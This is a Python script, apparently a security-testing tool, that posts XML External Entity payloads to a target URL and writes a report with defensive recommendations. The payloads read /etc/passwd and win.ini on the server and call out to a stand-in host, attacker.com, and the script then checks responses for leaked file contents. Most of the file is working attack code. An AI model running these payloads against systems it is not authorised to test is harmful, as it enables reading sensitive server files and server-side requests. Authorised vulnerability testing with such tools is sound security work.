#!/usr/bin/env python3
"""
XXE (XML External Entity) Injection Tester
Tests for XXE injection vulnerabilities.
"""

import sys
import requests
from typing import List

class XXETester:
    def __init__(self, url: str):
        self.url = url
        self.payloads = [
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>''',
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>''',
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<foo>&xxe;</foo>'''
        ]
        self.vulnerable = False
    
    def test_xxe(self) -> bool:
        """Test for XXE vulnerability"""
        print(f"[*] Testing {self.url} for XXE injection...")
        
        for payload in self.payloads:
            try:
                headers = {'Content-Type': 'application/xml'}
                response = requests.post(
                    self.url,
                    data=payload,
                    headers=headers,
                    timeout=10
                )
                
                # Check for file content indicators
                indicators = ['root:', 'bin/bash', 'for 16-bit', '[fonts]']
                if any(indicator in response.text for indicator in indicators):
                    print(f"[+] Potential XXE vulnerability detected!")
                    self.vulnerable = True
                    return True
            except Exception as e:
                print(f"[-] Error: {e}")
        
        return False
    
    def generate_report(self) -> str:
        """Generate XXE test report"""
        report = f"# XXE Injection Test Report for {self.url}\n\n"
        
        if self.vulnerable:
            report += "⚠️ **VULNERABLE**: XXE injection vulnerability detected!\n\n"
        else:
            report += "✅ No XXE vulnerability detected.\n\n"
        
        report += "## Tested Payloads\n\n"
        for i, payload in enumerate(self.payloads, 1):
            report += f"### Payload {i}\n\n"
            report += "```xml\n"
            report += payload
            report += "\n```\n\n"
        
        report += "## Recommendations\n\n"
        report += "1. Disable XML external entity processing\n"
        report += "2. Use whitelist for allowed XML entities\n"
        report += "3. Use simpler data formats (JSON) when possible\n"
        report += "4. Keep XML parsers updated\n\n"
        
        return report

def main():
    if len(sys.argv) < 2:
        print("Usage: python xxe_injection.py <url>")
        print("Example: python xxe_injection.py http://example.com/api/xml")
        sys.exit(1)
    
    url = sys.argv[1]
    tester = XXETester(url)
    
    tester.test_xxe()
    
    report = tester.generate_report()
    
    filename = "xxe_test_report.md"
    with open(filename, 'w') as f:
        f.write(report)
    
    print(f"[+] XXE testing complete")
    print(f"[+] Report saved to {filename}")
    print(f"[!] WARNING: Only test applications you own or have permission to test!")

if __name__ == '__main__':
    main()

